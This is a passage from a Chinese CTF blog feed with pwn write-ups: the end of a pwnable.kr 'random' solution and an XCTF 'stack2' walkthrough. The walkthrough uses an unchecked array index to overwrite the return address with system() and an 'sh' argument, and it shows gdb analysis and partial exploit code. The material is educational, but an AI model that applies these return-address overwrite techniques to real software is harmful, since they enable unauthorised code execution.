class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">        random = rand();        <span class="comment">// random value!</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">0xdeadbeef</span> ^ random);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果为<code>-1255736440</code></p></blockquote><h4 id="font-color-blue2输入结果得到flagfont"><a class="markdownIt-Anchor" href="#font-color-blue2输入结果得到flagfont"></a> <font color="blue"><code>2.输入结果，得到flag</code></font></h4><blockquote><p>得到如下的结果：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random@pwnable:~$ ./random </span><br><span class="line">-1255736440</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-colornavy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-colornavy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】stack2 writeup</title>
    <link href="https://muzibing.github.io/2020/06/08/2020.06.08%EF%BC%88123%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/08/2020.06.08（123）/</id>
    <published>2020-06-07T16:00:00.000Z</published>
    <updated>2020-06-14T04:43:16.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00相关知识点font"></a> <font color="navy"><code>0x00.相关知识点</code></font></h3><h4 id="font-color-blue1retn-指令font"><a class="markdownIt-Anchor" href="#font-color-blue1retn-指令font"></a> <font color="blue"><code>1.retn 指令</code></font></h4><p><code>格式</code>：retn</p><p><code>功能</code>：返回主程序。经常和<code>call</code>一起使用，当调用的过程结束后实现从过程返回至原调用程序的下一条指令，本指令不影响标志位</p><p><code>说明</code>：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作</p><ul><li><code>对段内调用</code>：返回时，由堆栈弹出一个字的返回地址的段内偏移量至IP</li><li><code>对段外调用</code>：返回时，由堆栈弹出的第一个字为返回地址的段内偏移量，将其送入IP中，由堆栈弹出第二个字为返回地址的段基址，将其送入CS中</li></ul><p><code>举例</code></p><p>     下面用一个简单的代码来说明一下retn的具体作用，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This_is_a_function.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        s = fun();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"s is %d\n"</span>,s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      main和fun函数的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">000011a9 &lt;fun&gt;:</span><br><span class="line">   0x565561a9 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x565561aa &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x565561ac &lt;+3&gt;:     push   ebx</span><br><span class="line">   0x565561ad &lt;+4&gt;:     sub    esp,0x4</span><br><span class="line">   0x565561b0 &lt;+7&gt;:     call   0x56556221 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0x565561b5 &lt;+12&gt;:    add    eax,0x2e4b</span><br><span class="line">   0x565561ba &lt;+17&gt;:    sub    esp,0xc</span><br><span class="line">   0x565561bd &lt;+20&gt;:    lea    edx,[eax-0x1ff8]</span><br><span class="line">   0x565561c3 &lt;+26&gt;:    push   edx</span><br><span class="line">   0x565561c4 &lt;+27&gt;:    mov    ebx,eax</span><br><span class="line">   0x565561c6 &lt;+29&gt;:    call   0x56556040 &lt;puts@plt&gt;</span><br><span class="line">   0x565561cb &lt;+34&gt;:    add    esp,0x10</span><br><span class="line">   0x565561ce &lt;+37&gt;:    mov    eax,0x0</span><br><span class="line">   0x565561d3 &lt;+42&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x565561d6 &lt;+45&gt;:    leave  </span><br><span class="line">   0x565561d7 &lt;+46&gt;:    ret</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">000011d8 &lt;main&gt;:</span><br><span class="line">   0x565561d8 &lt;+0&gt;:     lea    ecx,[esp+0x4]   </span><br><span class="line">   0x565561dc &lt;+4&gt;:     and    esp,0xfffffff0                                                               </span><br><span class="line">   0x565561df &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]                                                           </span><br><span class="line">   0x565561e2 &lt;+10&gt;:    push   ebp                                                                           </span><br><span class="line">   0x565561e3 &lt;+11&gt;:    mov    ebp,esp                                                                       </span><br><span class="line">   0x565561e5 &lt;+13&gt;:    push   ebx                                                                           </span><br><span class="line">   0x565561e6 &lt;+14&gt;:    push   ecx                                                                           </span><br><span class="line">   0x565561e7 &lt;+15&gt;:    sub    esp,0x10                                                                     </span><br><span class="line">   0x565561ea &lt;+18&gt;:    call   0x565560b0 &lt;__x86.get_pc_thunk.bx&gt;                                           </span><br><span class="line">   0x565561ef &lt;+23&gt;:    add    ebx,0x2e11                                                                   </span><br><span class="line">   0x565561f5 &lt;+29&gt;:    call   0x565561a9 &lt;fun&gt;                                                             </span><br><span class="line">   0x565561fa &lt;+34&gt;:    mov    DWORD PTR [ebp-0xc],eax                                                       </span><br><span class="line">   0x565561fd &lt;+37&gt;:    sub    esp,0x8                                                                       </span><br><span class="line">   0x56556200 &lt;+40&gt;:    push   DWORD PTR [ebp-0xc]                                                           </span><br><span class="line">   0x56556203 &lt;+43&gt;:    lea    eax,[ebx-0x1fe4]                                                                0x56556209 &lt;+49&gt;:    push   eax                                                                              0x5655620a &lt;+50&gt;:    call   0x56556030 &lt;printf@plt&gt;                                                       </span><br><span class="line">   0x5655620f &lt;+55&gt;:    add    esp,0x10                                                                     </span><br><span class="line">   0x56556212 &lt;+58&gt;:    mov    eax,0x0                                                                       </span><br><span class="line">   0x56556217 &lt;+63&gt;:    lea    esp,[ebp-0x8]                                                                 </span><br><span class="line">   0x5655621a &lt;+66&gt;:    pop    ecx                                                                           </span><br><span class="line">   0x5655621b &lt;+67&gt;:    pop    ebx</span><br><span class="line">   0x5655621c &lt;+68&gt;:    pop    ebp</span><br><span class="line">   0x5655621d &lt;+69&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x56556220 &lt;+72&gt;:    ret</span><br></pre></td></tr></table></figure><p>      观察main函数中调用fun函数时栈中的变化，如图所示：</p><p><img src="/images/123-1.png" alt></p><p>      从上图中可以看出，在进入fun函数之后，main+34偏移处的地址<code>0x565561fa</code>被放在了栈中，这也就是我们所说的返回地址，我们将断点打到<code>0x565561d6</code>处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于<code>movl %ebp %esp; popl %ebp</code>，具体的如下图：</p><p><img src="/images/123-2.jpg" alt></p><p>     也就是说，**在执行到 <code>ret</code> 语句的时候，寄存器<code>eip</code>指向函数的返回地址，**知道这一点就可以了</p><h4 id="font-color-blue2数组溢出原理font"><a class="markdownIt-Anchor" href="#font-color-blue2数组溢出原理font"></a> <font color="blue"><code>2.数组溢出原理</code></font></h4><p>      如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">3</span>] = &#123;<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> a; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入数组索引下标："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输出数组元素：array[%d] = 0x%x\n"</span>, index, <span class="built_in">array</span>[index]); <span class="comment">//数组越界读操作</span></span><br><span class="line">    <span class="comment">//array[index] = 1 ; //数组越界写操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下：</p><p><img src="/images/123-3.png" alt></p><p>      通过GDB的调试，我们可以发现数组寻址的方式为：<code>ebp+eax*4-0x18</code>，其中<code>0x18</code>是数组array首地址<code>ebp-0x18</code>得来的，<code>eax</code>也就是我们要输入的下标，这里之所以是<code>eax*4</code>，是因为数组array的值是int类型，4个字节大小。</p><p>      正常来说，我们要想输出array中的<code>0x22</code>的话，就需要我们输入下标<code>1</code>，使得<code>ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4</code>，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为<code>4</code>，那么该程序会将<code>0xffffd8c8+4*4-0x18=0xffffd8c0</code>地址处的值<code>0xffffd8e0</code>打印出来，如下图所示：</p><p><img src="/images/123-4.png" alt></p><p>      以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变<code>eip</code>的效果，本题就是一个很好的例子。</p><h4 id="font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"><a class="markdownIt-Anchor" href="#font-color-blue3字符类型在数组中存放的形式字符和字符字面值font"></a> <font color="blue"><code>3.字符类型在数组中存放的形式（字符和字符字面值）</code></font></h4><p>      首先来问一个问题：<code>计算机为什么用二进制和十六进制</code>？<sup>[2]</sup></p><blockquote><p>因为二值信号可以很容易地被表示、存储和传输。例如，可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。而由于用二进制表示法太冗长，而十进制表示法与位模式的互相转换很麻烦，替代的方法是以16为基数，即十六进制（hexadecimal）。</p></blockquote><p>      再来问一个问题：<code>什么是字符字面值？</code><sup>[2]</sup></p><blockquote><p>字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。<br>C语言中字符字面值是由一对<code>单引号括起来的单个字符</code>，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如：</p><ul><li>定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61；</li><li>定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，<code>printf(&quot;%d&quot;,a);</code>输出结果为<code>97</code></li></ul></blockquote><p>      总结如下：</p><blockquote><ul><li>字符型可以和整型可以相互转化，在C语言中<code>字符型就是一种整型</code>，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义；</li><li>字符字面值是由单引号括起来的单个字符；</li></ul></blockquote><p>      上程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">5</span>]=<span class="string">"abcd"</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="string">'c'</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>]==<span class="number">0x61</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[0] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">0</span>],a[<span class="number">0</span>],a[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a[1] == %c(char) == %d(int) == 0x%x(hex)\n"</span>,a[<span class="number">1</span>],a[<span class="number">1</span>],a[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   b == %c(char) == %d(int) == 0x%x(hex)\n"</span>,b,b,b);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"!="</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      输出的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[0] == a(char) == 97(int) == 0x61(hex)</span><br><span class="line">a[1] == b(char) == 98(int) == 0x62(hex)</span><br><span class="line">   b == c(char) == 99(int) == 0x63(hex)</span><br><span class="line">Press any key to continue</span><br></pre></td></tr></table></figure><blockquote><p>从上面的代码运行结果中可以看出，对于char类型输入0x62，这个值被当作字符面值相当于给a[1]输入了字符’b’，在内存中以二进制<code>01100010</code>的形式进行存储着</p></blockquote><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file stack </span><br><span class="line">stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec stack </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/stack2/stack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>开启了栈不可执行和金丝雀保护，也就是说我们无法使用栈溢出。使用IDA打开该文件，得到它的伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@18</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-90h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-8Ch]@6</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+20h] [bp-88h]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [bp-84h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+2Ch] [bp-7Ch]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [sp+30h] [bp-78h]@13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [sp+34h] [bp-74h]@20</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [sp+38h] [bp-70h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+9Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v14 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j), j) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>仔细观察上述伪代码，可以发现在选择更改新的值的时候，没有对数组上界进行限制，产生了数组溢出漏洞；又在IDA中发现<code>hackhere</code>函数，里面调用了<code>system(&quot;/bin/bash&quot;)</code>函数，这里参考<a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">官方的writeup</a>，指出：<code>这个题有个坑点在于题目给出了getshell的函数，但是出题人在搭建docker环境时未注意，环境中只给了sh，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到getshell，需要简单的ROP一下。</code>下面来确定v13与返回地址的偏移位置，v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。<sup>[1]</sup></p></blockquote><p><img src="/images/123-5.png" alt></p><blockquote><p>从上图可以看出该调试过程中的<code>main</code>函数ebp的地址为<code>0xffffd8d8</code>，而retn指令对应栈顶的地址为<code>0xffffd8ec</code>，也就是说返回地址的位置在<code>0xffffd8ec</code>，那么算下来两者之间差了<code>0xffffd8ec-0xffffd8d8=0x14</code>，这是因为开启了Canary的原因，正来说两者之间的差距应该为<code>0x4</code>，那么此时栈中的情况如下示意图：</p></blockquote><p><img src="/images/123-6.png" alt></p><blockquote><p>上图中包含了很多信息，主要有：</p><ul><li>返回地址相对于v13的偏移：<code>0x84</code></li><li>解释了为什么是<code>ebp+eax*1-0x70</code>：因为v13是一个char类型的字符数组，每一个值占一个空间</li></ul><p>那么下面我们来看看看怎么使得返回地址为system的地址，如下图：</p></blockquote><p><img src="/images/123-7.jpg" alt></p><blockquote><p>同样上图也包含了很多信息：</p><ul><li>因为是小端存储的方式，而system函数的地址为<code>0x08048450</code>，所以从低地址到高地址连续存储了<code>0x50</code>、<code>0x84</code>、<code>0x04</code>、<code>0x08</code></li><li>要明白得到<code>0x08048450</code>的结果是图中所示求得的，那么两种方式是否有联系呢？以后再探讨</li></ul></blockquote><p><img src="/images/123-8.png" alt></p><blockquote><p>通过gdb调试，我们可以看到返回地址已经成为了system函数地址，那么下面我们需要找到system函数的参数位置，其中栈的情况如下，</p></blockquote><p><img src="/images/123-10.png" alt></p><blockquote><p>从上图得知sh要写入的偏移是v13到返回地址的偏移再加上8<sup>[4]</sup>，我们进行gdb调试，看看是否能成功写入：</p></blockquote><p><img src="/images/123-9.png" alt></p><blockquote><p>从上图中可以看出我们已经成功地将system和sh的地址写入到我们想写入的地方</p></blockquote><h3 id="font-color-navy0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-解题步骤font"></a> <font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>根据上文的分析，我们找到system、sh的地址和v13相对于返回地址的偏移：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br></pre></td></tr></table></figure><blockquote><p>这道题目前面几步的选择无关紧要，所以我们可以直接写出这部分的脚本：</p></blockquote><figure class="highlight 